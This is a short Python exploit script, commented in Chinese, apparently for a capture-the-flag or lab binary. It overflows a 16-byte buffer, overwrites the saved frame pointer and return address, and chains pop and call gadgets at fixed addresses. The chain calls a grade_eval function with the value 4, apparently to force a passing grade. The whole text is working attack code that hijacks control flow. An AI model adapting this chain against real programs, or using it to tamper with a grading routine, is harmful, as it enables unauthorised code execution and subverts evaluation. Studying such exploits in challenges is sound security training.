import sys

GRADE_EVAL = 0x401978      # grade_eval 入口
POP_CHAIN  = 0x401A2A      # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
CALL_CHAIN = 0x401A10      # mov rdx,r15; mov rsi,r14; mov edi,r13d; call [r12+rbx*8]
CMD_BUF    = 0x602090      # 全局 command_buf（BSS，地址固定）

# --- 第 1 步：把 grade_eval 的地址送进 command_buf ---
# 只写低 4 字节就够了：0x401978 = 78 19 40 00，
# 高 4 字节本来就全是 0，所以 [command_buf] 读出来正好是 0x401978。
# strcpy 会被第 5 个字节的 \0 截断，正好停在这里。
p  = GRADE_EVAL.to_bytes(4, "little")
p += b"A" * 12                       # 填满 16 字节缓冲区

# --- 第 2 步：覆盖 saved rbp 和 input 的返回地址 ---
p += b"B" * 8                        # saved rbp（leave 之后不再使用）
p += POP_CHAIN.to_bytes(8, "little")  # ret -> 从栈上取出下面 6 个寄存器

# --- 第 3 步：pop 链的参数 ---
p += (0).to_bytes(8, "little")        # rbx = 0        -> [r12 + 0] 寻址
p += (0).to_bytes(8, "little")        # rbp = 0
p += CMD_BUF.to_bytes(8, "little")    # r12 = &command_buf
p += (4).to_bytes(8, "little")        # r13 = 4        -> edi = 4（grade）
p += (0).to_bytes(8, "little")        # r14 = 0        -> rsi
p += (0).to_bytes(8, "little")        # r15 = 0        -> rdx

# --- 第 4 步：进入调用链，call [command_buf] ---
p += CALL_CHAIN.to_bytes(8, "little")

p += b"\n"
sys.stdout.buffer.write(p)
